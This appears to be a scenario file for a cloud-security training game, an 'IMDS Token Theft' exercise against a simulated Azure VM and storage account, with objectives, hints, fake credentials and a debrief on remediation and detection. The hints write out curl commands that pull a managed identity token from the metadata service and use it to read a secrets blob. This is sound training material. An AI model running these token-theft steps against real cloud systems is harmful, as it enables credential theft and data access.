@@ -1,0 +1,270 @@
+id: imds-token-theft
+name: "IMDS Token Theft"
+difficulty: intermediate
+
+briefing: |
+  INTEL REPORT: You have gained initial access to an Azure Virtual Machine.
+
+  During your reconnaissance, you discovered the target system is running in
+  Azure and may have a Managed Identity assigned. Azure VMs can query the
+  Instance Metadata Service (IMDS) at 169.254.169.254 to obtain access tokens.
+
+  Your mission: Extract the managed identity token from IMDS and use it to
+  access Azure resources that the VM's identity has permissions to.
+
+  BACKGROUND:
+  The Instance Metadata Service (IMDS) is a REST API available at a well-known
+  non-routable IP address (169.254.169.254). It provides information about the
+  VM and, critically, allows managed identities to obtain OAuth tokens.
+
+  STARTING INTEL:
+  - You have shell access to an Azure VM
+  - IMDS endpoint: http://169.254.169.254/metadata/
+  - Requests require the header: Metadata: true
+  - Token endpoint: /metadata/identity/oauth2/token?api-version=2018-02-01&resource=<resource>
+
+  AVAILABLE TOOLS:
+  - curl              Query IMDS and access Azure resources
+  - az                Azure CLI (if authenticated)
+
+  REMINDER: This is an authorized security assessment. Document all findings.
+
+resources:
+  virtual_machines:
+    - name: web-server-prod
+      resource_group: production-rg
+      location: eastus
+      vm_size: Standard_D2s_v3
+      power_state: VM running
+      public_ip: 20.81.123.45
+      private_ip: 10.0.1.10
+      os_type: Linux
+      admin_username: azureuser
+      # IMDS-specific fields for realistic metadata
+      vm_id: "02aab8a4-74ef-476e-8182-f6d2ba4166a6"
+      subscription_id: "a1b2c3d4-5678-90ab-cdef-1234567890ab"
+      offer: "0001-com-ubuntu-server-focal"
+      publisher: "canonical"
+      sku: "20_04-lts-gen2"
+      version: "20.04.202402290"
+      platform_fault_domain: "0"
+      platform_update_domain: "0"
+      tags:
+        environment: production
+        application: web-frontend
+        owner: platform-team
+      identity:
+        type: SystemAssigned
+        principal_id: "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
+        tenant_id: "12345678-abcd-ef12-3456-7890abcdef12"
+
+  storage_accounts:
+    - name: contosobackups2024
+      resource_group: production-rg
+      location: eastus
+      kind: StorageV2
+      sku: Standard_LRS
+      access_tier: Hot
+      public_access: false
+      https_only: true
+      min_tls_version: TLS1_2
+      tags:
+        environment: production
+        data-classification: confidential
+      containers:
+        - name: application-secrets
+          public_access: none
+          blobs:
+            - name: database-credentials.json
+              content: |
+                {
+                  "production": {
+                    "host": "prod-sql-server.database.windows.net",
+                    "database": "CustomerDB",
+                    "username": "app_service",
+                    "password": "Pr0duct10n#Secr3t!2024",
+                    "connection_timeout": 30
+                  },
+                  "staging": {
+                    "host": "staging-sql-server.database.windows.net",
+                    "database": "CustomerDB_Staging",
+                    "username": "staging_app",
+                    "password": "St@g1ng_T3st!",
+                    "connection_timeout": 30
+                  }
+                }
+              content_type: application/json
+              size: 512
+
+            - name: api-keys.json
+              content: |
+                {
+                  "stripe": {
+                    "live_key": "FAKE_sk_live_xxxxxxxxxxxxxxxxxxxx",
+                    "test_key": "FAKE_sk_test_xxxxxxxxxxxxxxxxxxxx"
+                  },
+                  "sendgrid": {
+                    "api_key": "SG.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+                  },
+                  "twilio": {
+                    "account_sid": "ACxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+                    "auth_token": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+                  }
+                }
+              content_type: application/json
+              size: 384
+
+        - name: deployment-artifacts
+          public_access: none
+          blobs:
+            - name: deploy-config.yaml
+              content: |
+                deployment:
+                  environment: production
+                  cluster: aks-prod-eastus
+                  namespace: web-frontend
+                  replicas: 3
+
+                secrets:
+                  azure_client_id: "backup-automation-sp"
+                  azure_client_secret: "~Backup#Aut0mation_Secret!"
+                  azure_tenant_id: "12345678-abcd-ef12-3456-7890abcdef12"
+              content_type: application/yaml
+              size: 320
+
+  users:
+    - id: "user-001"
+      display_name: "Platform Admin"
+      user_principal_name: "platform-admin@contoso.onmicrosoft.com"
+      mail: "platform-admin@contoso.com"
+      job_title: "Senior Platform Engineer"
+      department: "Platform Engineering"
+      roles:
+        - "Contributor"
+        - "Storage Blob Data Contributor"
+
+  service_principals:
+    - id: "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
+      app_id: "sp-web-server-identity"
+      display_name: "web-server-prod-identity"
+      permissions:
+        - "Storage Blob Data Reader"
+        - "Storage Blob Data Contributor"
+
+objectives:
+  - id: discover_imds
+    description: "Discover and probe the IMDS endpoint"
+    trigger: "regex:curl.*169\\.254\\.169\\.254.*Metadata.*true"
+    points: 50
+    order: 1
+
+  - id: get_instance_metadata
+    description: "Retrieve VM instance metadata"
+    trigger: "regex:curl.*169\\.254\\.169\\.254.*/metadata/instance"
+    points: 75
+    order: 2
+
+  - id: extract_token
+    description: "Extract the managed identity access token"
+    trigger: "regex:curl.*169\\.254\\.169\\.254.*/metadata/identity/oauth2/token"
+    points: 125
+    order: 3
+
+  - id: use_token_storage
+    description: "Use the stolen token to access protected storage"
+    trigger: "regex:curl.*contosobackups2024\\.blob\\.core\\.windows\\.net.*Authorization.*Bearer"
+    points: 150
+    order: 4
+
+hints:
+  - objective_id: discover_imds
+    level: 1
+    text: "Azure VMs can reach IMDS at 169.254.169.254. All requests require a special header."
+    point_cost: 10
+
+  - objective_id: discover_imds
+    level: 2
+    text: "Try: curl -H 'Metadata: true' 'http://169.254.169.254/metadata/'"
+    point_cost: 25
+
+  - objective_id: get_instance_metadata
+    level: 1
+    text: "The /metadata/instance endpoint reveals VM details. Include api-version parameter."
+    point_cost: 15
+
+  - objective_id: get_instance_metadata
+    level: 2
+    text: "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'"
+    point_cost: 35
+
+  - objective_id: extract_token
+    level: 1
+    text: "Managed identity tokens are obtained from /metadata/identity/oauth2/token. Specify the resource."
+    point_cost: 20
+
+  - objective_id: extract_token
+    level: 2
+    text: "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/'"
+    point_cost: 50
+
+  - objective_id: use_token_storage
+    level: 1
+    text: "Use the access_token with an Authorization: Bearer header. Azure Storage also requires x-ms-version header."
+    point_cost: 25
+
+  - objective_id: use_token_storage
+    level: 2
+    text: "curl -H 'Authorization: Bearer <TOKEN>' -H 'x-ms-version: 2020-04-08' 'https://contosobackups2024.blob.core.windows.net/application-secrets/database-credentials.json'"
+    point_cost: 75
+
+debrief: |
+  === MISSION DEBRIEF ===
+
+  VULNERABILITY IDENTIFIED: Managed Identity Token Theft via IMDS
+
+  FINDINGS:
+  You successfully demonstrated how an attacker with VM access can abuse the
+  Instance Metadata Service to steal managed identity tokens and access
+  Azure resources.
+
+  ATTACK CHAIN:
+  1. Discovered IMDS endpoint at 169.254.169.254
+  2. Retrieved VM metadata revealing identity configuration
+  3. Extracted OAuth token for the managed identity
+  4. Used token to authenticate to Azure Storage
+  5. Accessed sensitive secrets in protected containers
+
+  IMPACT:
+  - Database credentials for production and staging exposed
+  - Third-party API keys (Stripe, SendGrid, Twilio) compromised
+  - Potential for lateral movement using extracted credentials
+  - Full read access to all data the managed identity can access
+
+  ROOT CAUSE:
+  - Overly permissive managed identity permissions (Storage Blob Data Contributor)
+  - Sensitive secrets stored in blob storage accessible to application identities
+  - No additional network restrictions on IMDS access
+
+  REMEDIATION RECOMMENDATIONS:
+  1. Apply principle of least privilege to managed identity permissions
+  2. Use Azure Key Vault instead of blob storage for secrets
+  3. Implement Azure Policy to restrict IMDS access if not needed
+  4. Enable NSG flow logs and monitor for IMDS access patterns
+  5. Use customer-managed keys for storage encryption
+  6. Implement conditional access policies for token usage
+  7. Consider using private endpoints for storage accounts
+
+  DETECTION STRATEGIES:
+  - Monitor for unusual IMDS token requests in Azure Activity logs
+  - Alert on storage access from unexpected identities
+  - Implement anomaly detection for managed identity usage patterns
+  - Review identity permissions regularly using Entra ID access reviews
+
+  AZURE SECURITY BEST PRACTICES:
+  - Store secrets in Azure Key Vault, not blob storage
+  - Use Azure RBAC with minimal permissions
+  - Enable Microsoft Defender for Cloud workload protection
+  - Implement network segmentation and private endpoints
+  - Regular security assessments of managed identity permissions
+
+  Great work demonstrating this attack path!
